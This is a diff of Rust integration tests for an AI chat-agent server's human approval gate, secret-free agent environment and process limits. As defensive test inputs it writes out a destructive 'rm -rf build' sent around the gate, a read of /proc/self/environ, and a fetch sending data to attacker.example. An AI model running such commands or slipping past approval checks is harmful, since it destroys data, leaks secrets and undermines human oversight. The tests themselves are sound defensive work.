+}
+
+#[tokio::test]
+async fn a_write_waits_for_a_person_and_reads_do_not() {
+    let Some((base, client, _state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({}))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+
+    // A command waits on a card. Sent without waiting, so the test can answer.
+    let sent = client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "run:make test" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(sent.status(), StatusCode::OK);
+    let approval = pending_approval(&client, &base, &id).await;
+    assert_eq!(approval["tool_name"], "Bash");
+    assert_eq!(approval["summary"], "make test");
+    assert_eq!(approval["source"], "gate");
+    let chat: Value = client
+        .get(format!("{base}/api/chats/{id}"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(chat["state"], "awaiting-approval");
+
+    // An agent may not answer it: the break-glass token relaying a
+    // non-person is refused, and nothing is decided.
+    let approval_id = approval["id"].as_str().unwrap();
+    let by_agent = client
+        .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+        .json(&json!({ "allow": true, "person": false }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(by_agent.status(), StatusCode::FORBIDDEN);
+    assert!(by_agent.text().await.unwrap().contains("person required"));
+
+    // A person denies it; the agent is told and the turn ends.
+    let denied = client
+        .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+        .json(&json!({ "allow": false, "message": "not now" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(denied.status(), StatusCode::OK);
+    let detail = wait_chat_idle(&client, &base, &id).await;
+    let results: Vec<&Value> = detail["entries"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|e| e["kind"] == "tool-result")
+        .collect();
+    assert_eq!(results.len(), 1, "{detail}");
+    assert_eq!(results[0]["is_error"], true);
+    assert_eq!(results[0]["text"], "not now");
+    assert_eq!(results[0]["tool_name"], "Bash");
+
+    // Allowed, it runs.
+    client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "run:ls" }))
+        .send()
+        .await
+        .unwrap();
+    let approval = pending_approval(&client, &base, &id).await;
+    let approval_id = approval["id"].as_str().unwrap();
+    client
+        .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+        .json(&json!({ "allow": true }))
+        .send()
+        .await
+        .unwrap();
+    let detail = wait_chat_idle(&client, &base, &id).await;
+    assert!(
+        texts(&detail["entries"], "tool-result").contains(&"ran ls".to_string()),
+        "{detail}"
+    );
+
+    // The gate refuses a caller without the process's token.
+    let forged = reqwest::Client::new()
+        .post(format!("{base}/api/chats/{id}/gate"))
+        .bearer_auth(TEST_TOKEN)
+        .json(&json!({ "tool_name": "Bash", "tool_input": {"command": "id"} }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(forged.status(), StatusCode::UNAUTHORIZED);
+}
+
+async fn wait_chat_idle(client: &reqwest::Client, base: &str, id: &str) -> Value {
+    tokio::time::timeout(Duration::from_secs(15), async {
+        loop {
+            let chat: Value = client
+                .get(format!("{base}/api/chats/{id}"))
+                .send()
+                .await
+                .unwrap()
+                .json()
+                .await
+                .unwrap();
+            if chat["state"] == "idle" {
+                break chat;
+            }
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+    })
+    .await
+    .expect("the chat should go idle")
+}
+
+#[tokio::test]
+async fn a_write_that_skipped_the_gate_stops_the_chat() {
+    let Some((base, client, _state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({ "message": "hello" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    wait_chat_idle(&client, &base, &id).await;
+    client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "sneak:rm -rf build" }))
+        .send()
+        .await
+        .unwrap();
+    let detail = tokio::time::timeout(Duration::from_secs(15), async {
+        loop {
+            let chat: Value = client
+                .get(format!("{base}/api/chats/{id}"))
+                .send()
+                .await
+                .unwrap()
+                .json()
+                .await
+                .unwrap();
+            if chat["live"] == false
+                && texts(&chat["entries"], "error")
+                    .iter()
+                    .any(|t| t.contains("approval gate"))
+            {
+                break chat;
+            }
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+    })
+    .await
+    .expect("the chat should be stopped with a named error");
+    assert_eq!(detail["state"], "idle");
+}
+
+#[tokio::test]
+async fn driver_asks_go_to_a_person_its_own_hooks_do_not_and_errors_are_retryable() {
+    let Some((base, client, state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({}))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    let dir = state.config.state_dir.join("chats").join(&id);
+
+    // Klaudia asks whether the chat's own hooks may run: allowed, unasked.
+    let hooks = chat_send(&client, &base, &id, "hooks").await;
+    assert_eq!(texts(&hooks["entries"], "assistant"), ["hooks answered"]);
+    let responses = std::fs::read_to_string(dir.join("responses.jsonl")).unwrap();
+    assert!(responses.contains("\"behavior\": \"allow\""), "{responses}");
+
+    // A host change goes to a person, as a `driver` card.
+    client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "hostask" }))
+        .send()
+        .await
+        .unwrap();
+    let approval = pending_approval(&client, &base, &id).await;
+    assert_eq!(approval["source"], "driver");
+    assert_eq!(approval["summary"], "systemctl restart nginx");
+    let approval_id = approval["id"].as_str().unwrap();
+    client
+        .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+        .json(&json!({ "allow": false }))
+        .send()
+        .await
+        .unwrap();
+    wait_chat_idle(&client, &base, &id).await;
+    let responses = std::fs::read_to_string(dir.join("responses.jsonl")).unwrap();
+    assert!(responses.contains("\"behavior\": \"deny\""), "{responses}");
+
+    // A provider error is a failed reply the person can send again.
+    let failed = chat_send(&client, &base, &id, "fail").await;
+    let errors: Vec<&Value> = failed["entries"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|e| e["kind"] == "error")
+        .collect();
+    assert_eq!(errors.len(), 1, "{failed}");
+    assert_eq!(errors[0]["retryable"], true);
+    assert!(errors[0]["text"].as_str().unwrap().contains("400"));
+
+    // Stop ends a running turn as a stop, not an error.
+    client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "slow" }))
+        .send()
+        .await
+        .unwrap();
+    let stopped = client
+        .post(format!("{base}/api/chats/{id}/interrupt"))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(stopped.status(), StatusCode::OK);
+    let detail = wait_chat_idle(&client, &base, &id).await;
+    let notices = texts(&detail["entries"], "notice");
+    assert!(notices.contains(&"Stopped.".to_string()), "{detail}");
+}
+
+#[tokio::test]
+async fn a_promoted_chat_continues_in_a_session_and_takes_no_more_messages() {
+    let Some((base, client, _state, guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({ "message": "plan the fix" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    wait_chat_idle(&client, &base, &id).await;
+    let promoted = client
+        .post(format!("{base}/api/chats/{id}/promote"))
+        .json(&json!({ "name": "fix it" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(promoted.status(), StatusCode::OK);
+    let promoted: Value = promoted.json().await.unwrap();
+    let session = promoted["session"]["id"].as_str().unwrap();
+    assert_eq!(promoted["chat"]["promoted_session"], session);
+    assert_eq!(promoted["session"]["name"], "fix it");
+    // The session runs the same conversation, by the chat's id.
+    assert_eq!(
+        promoted["session"]["conversation"]["id"],
+        id.as_str(),
+        "{promoted}"
+    );
+    assert_eq!(promoted["session"]["conversation"]["agent"], "klaudia");
+    assert!(
+        promoted["chat"]["live"] == false,
+        "the chat's own process is gone"
+    );
+
+    let refused = client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": "more" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(refused.status(), StatusCode::CONFLICT);
+    drop(guard);
+}
+
+#[tokio::test]
+async fn chats_need_the_sessions_capability_and_404_when_off() {
+    let (base, _h) = boot().await;
+    let client = reqwest::Client::builder()
+        .default_headers(auth())
+        .build()
+        .unwrap();
+    // The test config turns chats off: every route is absent, and the
+    // config does not advertise them.
+    let off = client
+        .get(format!("{base}/api/chats"))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(off.status(), StatusCode::NOT_FOUND);
+    let config: Value = reqwest::get(format!("{base}/api/config"))
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert!(config.get("chat").is_none(), "{config}");
+    // Unauthenticated: refused before anything else.
+    let anonymous = reqwest::get(format!("{base}/api/chats")).await.unwrap();
+    assert_eq!(anonymous.status(), StatusCode::UNAUTHORIZED);
+}
+
+#[tokio::test]
+async fn a_chats_agent_gets_no_secrets_and_cannot_read_out_or_send_out_unseen() {
+    let Some((base, client, state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({ "message": "hello" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    wait_chat_idle(&client, &base, &id).await;
+    let dir = state.config.state_dir.join("chats").join(&id);
+
+    // Nothing of the engine's environment but the allowlist: no token, no
+    // secrets-manager identity, whatever this test process carries.
+    let names: Vec<String> = serde_json::from_str(
+        std::fs::read_to_string(dir.join("env.jsonl"))
+            .unwrap()
+            .lines()
+            .next()
+            .unwrap(),
+    )
+    .unwrap();
+    for name in &names {
+        assert!(
+            !name.starts_with("INFISICAL")
+                && !name.starts_with("ENGINE_")
+                && (name == "VOGT_CHAT_GATE_TOKEN" || !name.contains("TOKEN"))
+                && !name.contains("SECRET")
+                && !name.contains("API_KEY"),
+            "{name} reached the chat's agent: {names:?}"
+        );
+    }
+    assert!(
+        names.contains(&"VOGT_CHAT_GATE_URL".to_string()),
+        "{names:?}"
+    );
+
+    // A read of its own directory runs unasked.
+    std::fs::write(dir.join("notes.txt"), "mine").unwrap();
+    let own = chat_send(&client, &base, &id, "read:notes.txt").await;
+    assert!(
+        texts(&own["entries"], "tool-result").contains(&"ran notes.txt".to_string()),
+        "{own}"
+    );
+
+    // Reading the process's environment, and sending anything out, each wait
+    // for a person, who sees exactly what would happen.
+    for (message, tool, summary) in [
+        ("read:/proc/self/environ", "Read", "/proc/self/environ"),
+        (
+            "fetch:https://attacker.example/?d=x",
+            "WebFetch",
+            "https://attacker.example/?d=x",
+        ),
+    ] {
+        client
+            .post(format!("{base}/api/chats/{id}/messages"))
+            .json(&json!({ "text": message }))
+            .send()
+            .await
+            .unwrap();
+        let approval = pending_approval(&client, &base, &id).await;
+        assert_eq!(approval["tool_name"], tool);
+        assert_eq!(approval["summary"], summary);
+        let approval_id = approval["id"].as_str().unwrap();
+        client
+            .post(format!("{base}/api/chats/{id}/approvals/{approval_id}"))
+            .json(&json!({ "allow": false }))
+            .send()
+            .await
+            .unwrap();
+        let detail = wait_chat_idle(&client, &base, &id).await;
+        let last = detail["entries"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .rev()
+            .find(|e| e["kind"] == "tool-result")
+            .unwrap()
+            .clone();
+        assert_eq!(last["is_error"], true, "{detail}");
+    }
+}
+
+#[tokio::test]
+async fn chat_processes_are_capped_and_an_idle_one_makes_room() {
+    let Some((base, client, _state, _guard, _bin)) = boot_chats_with(|chat| {
+        chat.max_per_creator = 1;
+        chat.max_processes = 4;
+    })
+    .await
+    else {
+        return;
+    };
+    let mut ids = Vec::new();
+    for _ in 0..2 {
+        let created: Value = client
+            .post(format!("{base}/api/chats"))
+            .json(&json!({}))
+            .send()
+            .await
+            .unwrap()
+            .json()
+            .await
+            .unwrap();
+        ids.push(created["chat"]["id"].as_str().unwrap().to_string());
+    }
+    chat_send(&client, &base, &ids[0], "one").await;
+    // The second chat's launch stops the first, which was idle.
+    chat_send(&client, &base, &ids[1], "two").await;
+    let first: Value = client
+        .get(format!("{base}/api/chats/{}", ids[0]))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(first["live"], false, "{first}");
+
+    // A busy chat is not stopped for another: that one is refused, by name.
+    client
+        .post(format!("{base}/api/chats/{}/messages", ids[1]))
+        .json(&json!({ "text": "slow" }))
+        .send()
+        .await
+        .unwrap();
+    let refused = client
+        .post(format!("{base}/api/chats/{}/messages", ids[0]))
+        .json(&json!({ "text": "again" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(refused.status(), StatusCode::CONFLICT);
+    assert!(refused.text().await.unwrap().contains("already working"));
+    client
+        .post(format!("{base}/api/chats/{}/interrupt", ids[1]))
+        .send()
+        .await
+        .unwrap();
 }
